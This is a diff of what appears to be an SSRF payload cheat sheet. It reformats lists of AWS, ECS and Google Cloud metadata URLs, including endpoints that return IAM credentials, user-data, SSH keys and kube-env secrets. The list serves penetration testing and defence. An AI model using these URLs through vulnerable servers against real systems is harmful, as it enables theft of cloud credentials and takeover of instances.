@@ -10,15 +10,15 @@ http://[0:0:0:0:0:ffff:169.254.169.254]
 ### AWS 
 Amazon Web Services (No Header Required), from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
 
-http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-http://169.254.169.254/latest/meta-data/ami-id
-http://169.254.169.254/latest/meta-data/reservation-id
-http://169.254.169.254/latest/meta-data/hostname
-http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
-http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+    http://169.254.169.254/latest/user-data
+    http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+    http://169.254.169.254/latest/meta-data/ami-id
+    http://169.254.169.254/latest/meta-data/reservation-id
+    http://169.254.169.254/latest/meta-data/hostname
+    http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+    http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
 
 ### ECS Task : https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html
 http://169.254.170.2/v2/credentials/
@@ -28,13 +28,15 @@ Source:  https://cloud.google.com/compute/docs/metadata
   - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" on API v1
   - Most endpoints can be accessed via the v1beta API without a header
 
-http://169.254.169.254/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/
-http://metadata/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/instance/hostname
-http://metadata.google.internal/computeMetadata/v1/instance/id
-http://metadata.google.internal/computeMetadata/v1/project/project-id
-
+    ```  
+    http://169.254.169.254/computeMetadata/v1/
+    http://metadata.google.internal/computeMetadata/v1/
+    http://metadata/computeMetadata/v1/
+    http://metadata.google.internal/computeMetadata/v1/instance/hostname
+    http://metadata.google.internal/computeMetadata/v1/instance/id
+    http://metadata.google.internal/computeMetadata/v1/project/project-id
+    ```
+    
 ### kube-env; thanks to JackMc for the heads up on this (https://hackerone.com/reports/341876)
 http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
 
